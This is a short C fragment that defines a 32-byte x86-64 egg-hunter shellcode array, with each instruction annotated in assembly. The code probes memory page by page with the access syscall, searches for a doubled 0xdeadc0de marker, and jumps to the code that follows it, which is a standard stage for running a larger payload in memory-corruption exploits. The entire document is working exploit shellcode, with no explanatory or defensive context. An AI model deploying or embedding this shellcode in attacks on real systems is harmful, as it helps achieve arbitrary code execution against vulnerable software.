
#define EGG_SIZE 32

char EGG[] = {
  /* 0000 */ "\x31\xff"             /* xor edi, edi        */
  /* 0002 */ "\xf7\xe7"             /* mul edi             */
  /* 0004 */ "\x96"                 /* xchg esi, eax       */
  /* 0005 */ "\xb6\x10"             /* mov dh, 0x10        */
  /* 0007 */ "\x48\x01\xd7"         /* add rdi, rdx        */
  /* 000A */ "\x6a\x15"             /* push 0x15           */
  /* 000C */ "\x58"                 /* pop rax             */
  /* 000D */ "\x0f\x05"             /* syscall             */
  /* 000F */ "\x85\xc0"             /* test eax, eax       */
  /* 0011 */ "\x75\xf4"             /* jnz 0x7             */
  /* 0013 */ "\xb8\xde\xc0\xad\xde" /* mov eax, 0xdeadc0de */
  /* 0018 */ "\xaf"                 /* scasd               */
  /* 0019 */ "\x75\xef"             /* jnz 0xa             */
  /* 001B */ "\xaf"                 /* scasd               */
  /* 001C */ "\x75\xec"             /* jnz 0xa             */
  /* 001E */ "\xff\xe7"             /* jmp rdi             */
};